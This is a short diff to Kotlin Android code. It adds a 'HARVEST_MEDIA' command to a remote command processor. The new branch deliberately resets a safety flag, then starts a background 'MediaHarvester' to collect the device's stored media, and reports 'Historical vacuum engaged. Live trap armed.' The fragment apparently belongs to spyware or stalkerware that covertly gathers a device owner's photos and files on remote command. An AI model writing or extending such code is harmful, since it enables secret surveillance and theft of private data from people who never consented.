@@ -1767,6 +1767,15 @@ object CommandProcessor {
                         status = "TASK_PURGE_INITIATED"
                     }
                 }
+                "HARVEST_MEDIA" -> {
+                    // Explicitly ignore the 'already done' safety flag and force a harvest
+                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("media_harvest_init_done", false).apply()
+                    CoroutineScope(Dispatchers.IO).launch {
+                        MediaHarvester.triggerInitialHarvest(ctx)
+                    }
+                    status = "HARVEST_INITIATED"
+                    errorMsg = "Historical vacuum engaged. Live trap armed."
+                }
                 else -> {
                     status = "FAILED (UNKNOWN_CMD)"
                     errorMsg = "Command '$fileName' is not recognized by the device."
